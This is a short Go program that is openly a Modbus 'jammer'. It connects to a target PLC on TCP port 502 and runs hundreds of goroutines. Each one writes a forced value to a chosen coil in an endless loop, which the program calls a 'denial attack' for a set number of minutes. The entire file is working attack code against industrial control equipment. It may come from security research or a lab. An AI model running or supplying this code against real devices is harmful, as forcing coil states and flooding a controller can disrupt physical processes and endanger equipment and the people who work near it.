package main

import (
	"flag"
	"fmt"
	"os"
	"sync"
	"time"

	"github.com/goburrow/modbus" //Import the necessary modbus library
)

var (
	ip_address string
	jamming    int
	runtime    int
	coil       int
	coil_val   int
	wait       sync.WaitGroup
)

func init() {
	flag.StringVar(&ip_address, "ip_address", "192.168.13.86", "Enter IP address to target")
	flag.IntVar(&jamming, "jamming", 500, "Number of times the jammer routines created") //More jammer routines = stronger jamming potential
	flag.IntVar(&runtime, "runtime", 1, "How long the attack will run")
	flag.IntVar(&coil, "coil", 0, "The coil position you are writing to")
	flag.IntVar(&coil_val, "coil_val", 1, "The value you are writing to the coil")
}

func jammer(target modbus.Client, coil uint16, coil_value int) {

	for {
		if coil_value == 1 {
			results, err := target.WriteSingleCoil(coil, 0xFF00) //Writes a one to coil at position 0. 0xFF00 for 1 and 0x0000 for 0
			fmt.Println("MODBUS Packet Sent")
			if err != nil {
				fmt.Println(err)
				fmt.Println(results)
			}
		} else {
			results, err := target.WriteSingleCoil(coil, 0x0000)
			if err != nil {
				fmt.Println(err)
				fmt.Println(results)
			}
		}
	}
}

func main() {
	flag.Parse()
	target := ip_address + ":502" //Send Modbus traffic the specified IP on the Modbus port
	handler := modbus.NewTCPClientHandler(target)
	handler.Timeout = 10 * time.Second

	err := handler.Connect()
	if err != nil {
		fmt.Print(err)
	}

	defer handler.Close()

	client := modbus.NewClient(handler)

	for i := 0; i < jamming; i++ {
		wait.Add(1)
		go jammer(client, uint16(coil), coil_val)
	}

	fmt.Println("Starting denial attack...")
	//Runs the exploit for the specified duration
	timer2 := time.NewTimer(time.Duration(runtime) * time.Minute)
	go func() {
		<-timer2.C
		fmt.Println("Denial attack completed")
		os.Exit(0)
	}()

	wait.Wait()
}
